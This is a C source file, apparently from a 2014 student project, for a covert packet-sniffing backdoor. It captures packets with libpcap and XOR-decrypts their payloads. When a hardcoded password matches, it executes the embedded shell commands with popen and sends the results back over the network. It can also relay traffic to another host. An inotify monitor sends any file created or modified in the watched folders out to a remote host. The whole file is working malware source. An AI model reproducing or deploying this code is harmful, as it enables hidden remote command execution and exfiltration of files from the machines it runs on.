#include "pktcap.h"

/* Globals for inotify and relay modes */
static volatile sig_atomic_t doneflag = 0;
int dest_relay_port, relay_mode = FALSE;
char relay_host[BUFFER];

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: startPacketCapture
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, 
		       char * listen_host, int listen_port, char * dest_host, int dest_port, int protocol)
-- 
-- RETURNS: 0, not important
-- 
-- NOTES: Initializes packet capture on dst port or src host based on protocol
----------------------------------------------------------------------------------------------------------------------*/
int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, 
		       char * listen_host, int listen_port, char * dest_host, int dest_port, int protocol)
{
	
	char nic_dev[BUFFER];		// NIC device name to monitor
	pcap_if_t *alldevs, *temp; 	// NIC list variables
    	char errbuf[PCAP_ERRBUF_SIZE]; 	// error buffer
    	bpf_u_int32 maskp;          	// subnet mask               
    	bpf_u_int32 netp;           	// ip 
    	char filter_exp[BUFFER];	// filter expression
	
    
    	/* Get all network interfaces */
    	if(pcap_findalldevs (&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error finding all devs: %s\n", errbuf);
		exit(1);
	}
	/* monitor the specified interface */
	for(temp = alldevs; temp; temp = temp->next)
	{
		if(strcmp(NETWORK_INT, temp->name) == 0)
			strcpy(nic_dev, temp->name);
	}

	if(pcap_lookupnet(nic_dev, &netp, &maskp, errbuf) < 0)
	{
		fprintf(stderr, "Error looking up IP/Netmask for device.\n");
		exit(1);
	}
	if((nic_descr = pcap_open_live(nic_dev, PKT_SIZE, 1, 500, errbuf)) == NULL)
	{
		fprintf(stderr, "Cannot open device for capturing\n");
		exit(1);	
	}
	
	/* make sure we're capturing on an Ethernet device */
	if (pcap_datalink(nic_descr) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", nic_dev);
		exit(EXIT_FAILURE);
	}

	/* Compiling the filter expression */
	if((dst == FROM_RELAY || dst == FROM_CLIENT) && protocol == TCP_PROTOCOL)
		sprintf(filter_exp, "tcp and dst port %d and not src host %s", listen_port, get_ip_addr(NETWORK_INT));
	if(dst == FROM_SERVER && protocol == TCP_PROTOCOL)	
		sprintf(filter_exp, "tcp and src host %s and not src host %s", listen_host, get_ip_addr(NETWORK_INT));
	if((dst == FROM_RELAY || dst == FROM_CLIENT) && protocol == UDP_PROTOCOL)
		sprintf(filter_exp, "udp and dst port %d and not src host %s", listen_port, get_ip_addr(NETWORK_INT));
	if(dst == FROM_SERVER && protocol == UDP_PROTOCOL)
		sprintf(filter_exp, "udp and src host %s and not src host %s", listen_host, get_ip_addr(NETWORK_INT));

	if(pcap_compile(nic_descr, &fp, filter_exp, 0, netp))
	{
		fprintf(stderr, "Cannot parse expression filter\n");
		exit(1);
	}
	/* Apply the filter to the card interface */
	if(pcap_setfilter(nic_descr, &fp) < 0)
	{
		fprintf(stderr, "Cannot set filter\n");
		exit(1);
	}
	
	if(dst == FROM_RELAY || dst == FROM_CLIENT)
	{
		dest_relay_port = dest_port;
		strcpy(relay_host, dest_host);
		
		if(dst == FROM_RELAY)
			relay_mode = TRUE;
	}

	/* Use callback to process packets */
	pcap_loop(nic_descr, -1, pkt_callback, NULL);

	return 0;
}

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: stopPacketCapture
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp){
-- 
-- RETURNS: 0, not important
-- 
-- NOTES: Stops the libpcap capture loop... except the loop blocks the thread, and cant be called from other threads.
--        Should be attached to a signal handler
----------------------------------------------------------------------------------------------------------------------*/
int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp){
	pcap_freecode(&fp);
	pcap_close(nic_descr);
	return 0;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: pkt_callback
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet)
-- 
-- RETURNS: void
-- 
-- NOTES: Callback function of libpcap loop.  When packet is received, goes through this.
--        decrypts, checks for password, passes elsewhere for further processing
----------------------------------------------------------------------------------------------------------------------*/
void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet)
{		
	const struct ip_struct * ip;
	const struct tcp_struct * tcp;
	const unsigned char * payload;

	int size_ip, size_tcp, size_udp, size_payload;
	int mode, datalen;
	char password[strlen(PASSWORD) + 1];
	char * decrypted;
	char * command;

	ip = (struct ip_struct *)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip) * 4;

	if (size_ip < 20) {
		fprintf(stderr, "Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	
	/* if the packet is neither TCP nor UDP */	
	if(ip->ip_p == IPPROTO_TCP)
	{

		/* define/compute tcp header offset */
		tcp = (struct tcp_struct *)(packet + SIZE_ETHERNET + size_ip);
		size_tcp = TH_OFF(tcp) * 4;
	
		if (size_tcp < 20) {
			fprintf(stderr, "Invalid TCP header length: %u bytes\n", size_tcp);
			return;
		}

		/* define/compute tcp payload (segment) offset */
		payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
		size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
	}
	if(ip->ip_p == IPPROTO_UDP)
	{
		
		/* define/compute udp header offset */
		size_udp = 8;

		/* define/compute udp payload (segment) offset */
		payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_udp);
		size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);
	}

	/* Decrypt the payload */
	iSeed(xor_key, 1);
	decrypted = xor_cipher((char *)payload, size_payload);

	memset(password, 0, sizeof(password));
	if(sscanf(decrypted, "%s %d", password, &mode) < 0)
	{
		fprintf(stderr, "scanning error\n");
		return;
	}
	if(relay_mode == TRUE)
	{
		printf("Capturing packet from: %s\n", inet_ntoa(ip->ip_src));
		printf("Relay to: %s\n", relay_host);			
		relayPacket((char *)payload, size_payload, get_ip_addr(NETWORK_INT), relay_host, dest_relay_port, ip->ip_p);
		return;
	}

	command = malloc((PKT_SIZE + 1) * sizeof(char));
	datalen = parse_cmd(command, decrypted, size_payload);

	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
	{
		fprintf(stderr, "Password Authenticated. Executing command.\n");
		process_command(command, get_ip_addr(NETWORK_INT), relay_host, dest_relay_port, ip->ip_p);
		free(command);
		free(decrypted);
		return;
	}
	else if (mode == CLIENT_MODE && (strcmp(password, PASSWORD) == 0))
	{
		
		FILE* fp;
		char fileName[256];
		char* data;
		int filenamelen;
		int packetMode;
		int transferMode;
		char* tempCommand;
		
		if(sscanf(command, "%d", &packetMode) < 0) {
			fprintf(stderr, "scanning error\n");
			return;
		}
		tempCommand = command + 1;
		//command +=1;
		if (packetMode == TRANSFER_MODE){
			if(sscanf(tempCommand, "%d %s", &transferMode, fileName ) < 0) {
				fprintf(stderr, "scanning error\n");
				return;
			}
			
			if (transferMode == CREATE_MODE){
			 	if( (access( fileName, 0 )) != -1 ) {
			 		char tempName[256];
			 		
			 		int count=1;
			 		sprintf(tempName, "%s%d", fileName, count);
			 		while((access( tempName, 0 )) != -1){
			 			sprintf(tempName, "%s%d", fileName, count);
			 			count++;
			 			
			 		}
					//rename(backup) old file
					rename(fileName, tempName);
					
					
				}
				
			}
			printf("Temp Command: %s\n", tempCommand);
			data = strstr(tempCommand, fileName) ;
			data += strlen(fileName) + 1;
			filenamelen = data - command;
			//open file and append payload data to file
			fp = fopen(fileName, "a+b");
			if(fp==NULL){fprintf(stderr, "file open error\n"); return;}
			printf("Datalen: %d\n", datalen-filenamelen);
			fwrite(data, sizeof(char), datalen-filenamelen, fp);
			fclose(fp);
			
		} else if(packetMode == RESPONSE_MODE){// is command output
			//print command results to stdout
			printf("%s\n", tempCommand);
		}
		//printf("%s\n", command);
		free(command);
		free(decrypted);
		return;
	}
	else
	{
		fprintf(stderr, "Incorrect Password\n");
		return;
	}

}

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: relayPacket
-- 
-- DATE: 2014/12/02
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int relayPacket(char * payload, int size_payload,  const char * src_ip, 
		const char * dest_ip, const int dest_port, int protocol)
-- 
-- RETURNS: 0
-- 
-- NOTES: Wrapper function of send_packet that will essentially forward the encrypted packet to the specified host
--	  passed in.
----------------------------------------------------------------------------------------------------------------------*/
int relayPacket(char * payload, int size_payload,  const char * src_ip, 
		const char * dest_ip, const int dest_port, int protocol)
{
	send_packet(payload, protocol, size_payload, src_ip, dest_ip, dest_port);
	return 0;
}


/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: parse_cmd
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: char * parse_cmd(char * data)
-- 
-- RETURNS: string of received command/text
-- 
-- NOTES: extracts data between delimiters 
----------------------------------------------------------------------------------------------------------------------*/
int parse_cmd(char * command, char * data, int size)
{
	char * start, * end;
	/*char * */
	
	printf("Data: %s\n", data);
	printf("Data end: %s\n", data+size-4);
	printf("Size: %d\n", size);
	/* Point to the first occurance of pre-defined command string */
	start = strstr(data, CMD_START);

	/* Jump ahead past the pre-defined command string to point to the first
	   actual command character */
	start += strlen(CMD_START);

	/* Find the command end string, starting from the start pointer */
	//if((end = strstr(start, CMD_END)) == NULL)
	

	if((end = memmem(data, size, CMD_END, strlen(CMD_END))) == NULL)
	{
		printf("End command not found\n");
		end = data + size;
	}
		printf("pointers: %p, %p , %p\n",data, start,end	);
	memset(command, 0, PKT_SIZE);
	memcpy(command, start, end - start); // Segmentation Fault here, don't know why

	return end - start;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: process_command
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int send_command(char * command, const struct ip_struct * ip, const int dest_port)
-- 
-- RETURNS: 0 for ok, -1 for error
-- 
-- NOTES: Processes a command and gets the results.  encrypts and sends packet of results to originating host
----------------------------------------------------------------------------------------------------------------------*/
int process_command(char * command, const char * src_ip, const char * dest_ip, const int dest_port, int protocol)
{
	FILE *fp;

	char cmd_results[PKT_SIZE];
	char packet[PKT_SIZE];

	if((fp = popen(command, "r")) == NULL)
	{
		fprintf(stderr, "Cannot process command.\n");
		return -1;
	}
	
	while(fgets(cmd_results, PKT_SIZE - 1, fp) != NULL)
	{
		cmd_results[strlen(cmd_results)-1] = '\0';
		//Format packet payload
		sprintf(packet, "%s %d %s%d%s%s", PASSWORD, CLIENT_MODE, CMD_START, RESPONSE_MODE, cmd_results, CMD_END);
		printf("Packet: %s\n", packet);
		//Encrypt payload
		
		//Send it over to the client
		iSeed(xor_key, 1);
		send_packet(xor_cipher(packet, strlen(packet)), protocol, strlen(packet), src_ip, dest_ip, dest_port);
		
		memset(packet, 0, sizeof(packet));
		memset(cmd_results, 0, sizeof(cmd_results));
	}
	pclose(fp);
	
	return 0;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: send_file_data
-- 
-- DATE: 2014/11/26
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int send_file_data(const char* folder, const char * fileName, const char * src_ip, const char * dest_ip, const int dest_port, int protocol)
-- 
-- RETURNS: 0
-- 
-- NOTES: reads specified file and sends contents to specified destination.
----------------------------------------------------------------------------------------------------------------------*/
int send_file_data(const char* folder, const char * fileName, const char * src_ip, const char * dest_ip, const int dest_port, int protocol){
	FILE* fp;
	char data[PKT_SIZE];
	int count = 0;
	int transferMode, bytes_read, packet_len;
	char * tempPointer;
	
	char packet[PKT_SIZE];
	
	char filePath [516];
	sprintf(filePath, "%s%s", folder, fileName );
	fp = fopen(filePath, "rb");
	if(fp==NULL){fprintf(stderr, "file open error."); return -1;}
	//read file
	while((bytes_read = fread(data, 1, PKT_SIZE - 100, fp)) > 0)
	{
		if(count == 0){
			transferMode = CREATE_MODE;
		}else {
			transferMode = APPEND_MODE;
		}

		tempPointer = packet;
		//Format packet payload
		sprintf(packet, "%s %d %s%d %d %s ", PASSWORD, CLIENT_MODE, CMD_START, TRANSFER_MODE, transferMode, fileName);
		tempPointer += strlen(packet);

		memcpy(tempPointer, data, bytes_read);
		tempPointer += bytes_read;

		memcpy(tempPointer, CMD_END, strlen(CMD_END));
		tempPointer += strlen(CMD_END);
		
		packet_len = tempPointer - packet;
		printf("Packet Size: %d\n", packet_len);
		
		//Encrypt payload
		//Send it over to the client
		iSeed(xor_key, 1);
		send_packet(xor_cipher(packet, packet_len), protocol, packet_len, src_ip, dest_ip, dest_port);
		
		memset(packet, 0, sizeof(packet));
		memset(data, 0, sizeof(data));
		count ++;
	}
	fclose(fp);
	return 0;
}

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: initFileMonitor
-- 
-- DATE: 2014/11/26
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int initFileMonitor(struct filelist* folder, const char* src_ip, const char* dest_ip, const int dest_port, int protocol)
-- 
-- RETURNS: 0
-- 
-- NOTES: initialize file monitoring of specified folders. On events, send file info to send_file_data function
----------------------------------------------------------------------------------------------------------------------*/
int initFileMonitor(struct filelist* folder, const char* src_ip, const char* dest_ip, const int dest_port, int protocol){

	
	int len, i, ret, fd, wd;
//	struct timeval time;
	static struct inotify_event *event;
	fd_set rfds;
	char buf[BUFFER];
	const char* tempFolder;
	/*struct sigaction act;*/


	// time out after 10 seconds	
	//time.tv_sec = 10;
	//time.tv_usec = 0;

	fd = inotify_init();
	if (fd < 0)
		perror ("inotify_init");
	
	struct filelist* fileNode = folder;
	while(fileNode!=NULL){
		//wd = inotify_add_watch (fd, folder, (uint32_t)ALL_MASK);
		wd = inotify_add_watch (fd, fileNode->path, (uint32_t)IN_MODIFY|IN_CREATE|IN_DELETE);
	
		if (wd < 0)
			perror ("inotify_add_watch");
		fileNode->wd = wd;
		fileNode = fileNode->next;
	}
	FD_ZERO (&rfds);
	FD_SET (fd, &rfds);

	// set up the signal handler 

	/*act.sa_handler = set_done_flag;
	act.sa_flags = 0;
	if ((sigemptyset (&act.sa_mask) == -1 || sigaction (SIGINT, &act, NULL) == -1))
	{
		perror ("Failed to set SIGINT handler");
		exit (EXIT_FAILURE);
	}*/
	
	printf("Start file monitoring\n");

	while (!doneflag)
	{
		ret = select (fd + 1, &rfds, NULL, NULL, NULL);
		len = read (fd, buf, BUFFER);
	
		i = 0;
		if (len < 0) 
		{
        		if (errno == EINTR) /* need to reissue system call */
				perror ("read");
        		else
                		perror ("read");
		} 
		else if (!len) /* BUF_LEN too small? */
		{
			printf ("buffer too small!\n");
			exit (1);
		}

		while (i < len) 
		{
        		//struct inotify_event *event;
        		event = (struct inotify_event *) &buf[i];

        		printf ("\nwd=%d mask=%u cookie=%u len=%u\n", event->wd, event->mask, event->cookie, event->len);
        		if (event->len)
                		printf ("name=%s\n", event->name);
        		i += EVENT_SIZE + event->len;
		}
	
		if (ret < 0)
			perror ("select");
		else if (!ret)
			printf ("timed out\n");
		else if (FD_ISSET (fd, &rfds))
		{
			if (event->mask & IN_MODIFY || event->mask & IN_CREATE){

				fileNode = folder;
				while(fileNode!=NULL){
					if(fileNode->wd == event->wd){
						tempFolder = fileNode->path;
						printf ("%d %d %s\n",event->wd, fileNode->wd, tempFolder);
						break;
					}
					fileNode = fileNode->next;
				}
				printf ("Temp Folder: %s\n", tempFolder);
				send_file_data(tempFolder, event->name, src_ip, dest_ip, dest_port, protocol);
			}


		}
	}
	
	printf ("Cleaning up and Terminating....................\n");
	fflush (stdout);
	ret = inotify_rm_watch (fd, wd);
	if (ret)
		perror ("inotify_rm_watch");
	if (close(fd))
		perror ("close");
	return 0;
}

